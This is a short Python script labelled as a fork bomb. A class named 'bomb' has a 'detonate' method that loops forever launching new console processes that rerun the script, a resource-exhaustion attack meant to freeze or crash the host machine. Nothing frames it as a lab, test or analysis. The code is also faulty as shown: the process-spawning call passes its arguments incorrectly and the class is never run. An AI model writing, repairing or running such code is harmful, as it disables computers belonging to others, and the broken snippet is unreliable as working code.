import os
import sys
import subprocess

# forkbomb

class bomb:

    def __init__(self):
        print("New instance created!")

    def get_path(self):
        self.file_path = os.path.abspath(__file__)

    def detonate(self):
        print("Detonating...")
        while True:
            subprocess.Popen(sys.executable, self.file_path, subprocess.CREATE_NEW_CONSOLE)


